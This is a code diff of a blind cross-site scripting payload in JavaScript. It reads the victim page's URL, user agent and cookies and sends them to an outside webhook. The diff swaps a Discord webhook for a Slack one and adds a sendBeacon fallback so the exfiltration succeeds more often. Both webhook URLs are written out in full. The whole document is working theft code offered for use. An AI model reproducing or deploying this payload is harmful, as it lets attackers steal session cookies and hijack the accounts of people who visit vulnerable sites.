@@ -1,29 +1,22 @@
 (function () {
   const cap = (s, n) => (s || '').toString().slice(0, n);
-  const escbt = s => (s || '').toString().replace(/`/g, '\\`');
+  const msg = [
+    'Blind XSS fired',
+    'URL: ' + cap(location.href, 1800),
+    'UA: ' + cap(navigator.userAgent, 1800),
+    'Cookies: ' + cap(document.cookie || 'NA', 1800),
+    'Time: ' + new Date().toISOString()
+  ].join(' | ');
 
-  const data = {
-    url: location.href,
-    ua: cap(navigator.userAgent, 1000),
-    ck: cap(document.cookie || 'NA', 1000),
-    ts: new Date().toISOString()
-  };
+  const SLACK_WEBHOOK = 'https://hooks.slack.com/services/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';
 
-  const embed = {
-    title: 'Blind XSS',
-    description: `URL: ${escbt(data.url)}\nTime: ${data.ts}`,
-    fields: [
-      { name: 'UA', value: escbt(data.ua) },
-      { name: 'Cookies', value: escbt(data.ck) }
-    ]
-  };
+  // Try a simple fetch first (no custom headers to reduce preflight).
+  try {
+    fetch(SLACK_WEBHOOK, { method: 'POST', body: JSON.stringify({ text: msg }) });
+  } catch (e) {}
 
-  const form = new FormData();
-  form.append('payload_json', JSON.stringify({
-    content: 'Blind XSS fired',
-    embeds: [embed]
-  }));
-
-  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1411319017452339301/0kk_SFr88XR9mm8v22bjgcDwdCmPeWXqAE4zSnmtrEI8DKf6DFSMJ6srVpn9_aErB37o';
-  try { fetch(DISCORD_WEBHOOK, { method: 'POST', body: form }); } catch (e) {}
+  // Fallback: sendBeacon (opaque, but often succeeds in sending the body).
+  try {
+    navigator.sendBeacon && navigator.sendBeacon(SLACK_WEBHOOK, JSON.stringify({ text: msg }));
+  } catch (e) {}
 })();
